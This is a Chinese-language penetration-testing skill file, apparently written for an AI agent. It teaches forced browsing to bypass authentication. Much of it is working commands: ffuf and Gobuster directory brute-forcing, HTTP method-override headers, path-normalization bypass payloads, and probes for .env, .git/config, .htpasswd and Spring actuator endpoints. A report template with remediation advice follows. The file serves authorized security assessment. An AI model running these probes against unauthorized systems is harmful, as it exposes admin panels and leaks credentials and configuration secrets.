---
name: cszh-bypassing-authentication-with-forced-browsing
description: 在授权安全评估中，通过枚举 URL 并绕过身份验证控制，发现和访问未受保护的页面、API 及管理界面。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 bypassing-authentication-with-forced-browsing），正文按中文原文照录。

**这个技能干什么**：在授权安全评估中，通过枚举 URL 并绕过身份验证控制，发现和访问未受保护的页面、API 及管理界面。

**什么时候用**：需要按上游中文方法论执行「bypassing-authentication-with-forced-browsing」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 强制浏览绕过身份验证（Bypassing Authentication with Forced Browsing）

## 适用场景

- 在授权渗透测试（penetration testing）期间，发现隐藏的或未受保护的管理页面
- 测试身份验证（authentication）是否在所有应用程序端点上得到一致执行
- 识别在生产环境中暴露的备份文件、配置文件和调试接口
- 评估应需要身份验证的 API 端点的访问控制
- 在安全审计期间，验证所有敏感资源是否执行会话验证

## 前置条件

- **授权**：涵盖目录枚举的书面渗透测试协议
- **ffuf**：快速 Web 模糊器（`go install github.com/ffuf/ffuf/v2@latest`）
- **Gobuster**：目录暴力破解工具（`apt install gobuster`）
- **Burp Suite**：用于拦截和分析请求与响应
- **字典**：SecLists 集合（`git clone https://github.com/danielmiessler/SecLists.git`）
- **目标访问**：网络连通性以及用于认证对比的有效测试凭据

## 工作流程

### 步骤 1：枚举隐藏目录和文件

使用 ffuf 或 Gobuster 发现应用程序导航中未链接的路径。

```bash
# 使用 ffuf 进行目录枚举
ffuf -u https://target.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,301,302,403 \
  -fc 404 \
  -o results-dirs.json -of json \
  -t 50 -rate 100

# 使用常见扩展名枚举文件
ffuf -u https://target.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -e .php,.asp,.aspx,.jsp,.html,.js,.json,.xml,.bak,.old,.txt,.cfg,.conf,.env \
  -mc 200,301,302,403 \
  -fc 404 \
  -o results-files.json -of json \
  -t 50 -rate 100

# 使用 Gobuster 进行目录枚举
gobuster dir -u https://target.example.com \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -s "200,204,301,302,307,403" \
  -x php,asp,aspx,jsp,html \
  -o gobuster-results.txt \
  -t 50
```

### 步骤 2：发现管理和调试接口

针对常见管理路径和调试端点进行探测。

```bash
# 管理面板枚举
ffuf -u https://target.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302 \
  -t 50 -rate 100

# 手动检查的常见管理路径：
# /admin, /administrator, /admin-panel, /wp-admin
# /cpanel, /phpmyadmin, /adminer, /manager
# /console, /debug, /actuator, /swagger-ui
# /graphql, /graphiql, /.env, /server-status

# API 端点发现
ffuf -u https://target.example.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403 \
  -fc 404 \
  -o api-results.json -of json

# 检查 Spring Boot Actuator 端点
for endpoint in env health info beans configprops mappings trace; do
  curl -s -o /dev/null -w "%{http_code} /actuator/$endpoint\n" \
    "https://target.example.com/actuator/$endpoint"
done
```

### 步骤 3：测试已发现端点的身份验证执行情况

比较未认证和已认证请求的响应。

```bash
# 不带身份验证测试
curl -s -o /dev/null -w "%{http_code}" \
  "https://target.example.com/admin/dashboard"

# 使用有效会话 cookie 测试
curl -s -o /dev/null -w "%{http_code}" \
  -b "session=valid_session_token_here" \
  "https://target.example.com/admin/dashboard"

# 自动检查：比较响应大小
# 未认证请求
curl -s "https://target.example.com/admin/users" | wc -c

# 已认证请求
curl -s -b "session=valid_token" \
  "https://target.example.com/admin/users" | wc -c

# 如果两者返回相似内容，则未执行身份验证

# 使用 Burp Intruder 测试：发送已发现 URL 列表
# 不带 cookies，标记所有返回 200 的响应
```

### 步骤 4：测试基于 HTTP 方法的身份验证绕过

某些应用程序仅对特定 HTTP 方法执行身份验证。

```bash
# 对受保护端点测试不同 HTTP 方法
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" "https://target.example.com/admin/settings"
done

# 测试 HTTP 方法覆盖头
curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "X-HTTP-Method-Override: GET" \
  "https://target.example.com/admin/settings"

curl -s -o /dev/null -w "%{http_code}" \
  -H "X-Original-Method: GET" \
  -H "X-Rewrite-URL: /admin/settings" \
  "https://target.example.com/"
```

### 步骤 5：测试路径遍历和 URL 规范化绕过

利用 URL 解析差异绕过基于路径的身份验证规则。

```bash
# 路径规范化绕过尝试
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/ADMIN/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/./dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/public/../admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin%2fdashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/;/admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin;anything/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/.;/admin/dashboard"

# 双重 URL 编码
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/%2561dmin/dashboard"

# 尾随字符
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard/"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard.json"
curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard%00"
```

### 步骤 6：发现备份和配置文件

搜索 Web 服务器上意外暴露的敏感文件。

```bash
# 备份文件发现
ffuf -u https://target.example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -e .bak,.old,.orig,.save,.swp,.tmp,.dist,.config,.sql,.gz,.tar,.zip,.env \
  -mc 200 -t 50 -rate 100

# 常见敏感文件
for file in .env .git/config .git/HEAD .svn/entries \
  web.config wp-config.php.bak config.php.old \
  database.yml .htpasswd server-status phpinfo.php \
  robots.txt sitemap.xml crossdomain.xml; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.example.com/$file")
  if [ "$status" != "404" ]; then
    echo "FOUND ($status): $file"
  fi
done

# Git 仓库暴露检查
curl -s "https://target.example.com/.git/HEAD"
# 如果返回 "ref: refs/heads/main"，则 git 仓库已暴露
```

## 核心概念

| 概念 | 定义 |
|---------|-------------|
| **强制浏览（Forced Browsing）** | 直接访问服务器上存在但未被链接的 URL |
| **目录枚举（Directory Enumeration）** | 通过字典对目录和文件名进行暴力破解，发现隐藏内容 |
| **身份验证绕过（Authentication Bypass）** | 因缺少访问检查而无需有效凭据访问受保护资源 |
| **路径规范化（Path Normalization）** | 利用 Web 服务器与应用框架解析 URL 路径的差异 |
| **基于方法的绕过（Method-based Bypass）** | 使用可能没有身份验证检查的替代 HTTP 方法（PUT、DELETE） |
| **信息泄露（Information Disclosure）** | 敏感配置文件、备份或调试接口的暴露 |
| **纵深防御（Defense in Depth）** | 在多个级别执行身份验证的分层安全控制 |

## 工具与系统

| 工具 | 用途 |
|------|---------|
| **ffuf** | 用于目录、文件和参数枚举的快速 Web 模糊器 |
| **Gobuster** | 用 Go 编写的目录和 DNS 暴力破解工具 |
| **Feroxbuster** | 具有自动递归功能的递归内容发现工具 |
| **DirBuster** | OWASP 基于 Java 的目录暴力破解工具，带图形界面 |
| **Burp Suite** | 用于请求拦截和自动扫描的 HTTP 代理 |
| **SecLists** | 用于安全测试的综合字典集合 |

## 常见场景

### 场景：暴露的管理面板

`/admin/` 处的管理面板仅通过导航中不链接来隐藏。直接访问 URL 可以无需任何身份验证检查即可看到完整的管理界面。

### 场景：未受保护的 API 端点

`/api/v1/users` 和 `/api/v1/settings` 处的 API 端点在前端应用程序中需要身份验证，但后端 API 不执行会话验证，允许未经身份验证的直接访问。

### 场景：包含凭据的备份文件

开发人员在生产服务器上留下了 `config.php.bak`。该备份文件包含明文数据库凭据，通过基于扩展名的枚举被发现。

### 场景：Spring Boot Actuator 暴露

`/actuator/env` 端点在没有身份验证的情况下暴露，泄露包括数据库连接字符串、API 密钥和机密在内的环境变量。

## 输出格式

```
## 强制浏览 / 身份验证绕过发现

**漏洞**: 管理界面缺少身份验证
**严重性**: 严重（CVSS 9.1）
**位置**: /admin/dashboard（GET，无需身份验证）
**OWASP 类别**: A01:2021 - 访问控制失效

### 发现的未受保护资源
| 路径 | 状态 | 需要认证 | 内容 |
|------|--------|---------------|---------|
| /admin/dashboard | 200 | 否 | 完整管理面板 |
| /admin/users | 200 | 否 | 用户管理 |
| /actuator/env | 200 | 否 | 环境变量 |
| /config.php.bak | 200 | 否 | 数据库凭据 |
| /.git/HEAD | 200 | 否 | Git 仓库元数据 |

### 影响
- 对管理功能的未经授权访问
- 能够创建、修改和删除用户账户
- 数据库凭据和 API 密钥泄露
- 通过暴露的 Git 仓库完全泄露源代码

### 建议
1. 在服务器/中间件级别为所有管理路由实施身份验证检查
2. 从生产环境中删除备份文件、调试端点和版本控制元数据
3. 配置 Web 服务器以拒绝访问敏感文件扩展名（.bak、.old、.env、.git）
4. 为管理界面实施基于 IP 的访问限制
5. 使用反向代理限制对仅限内部的端点的访问
```
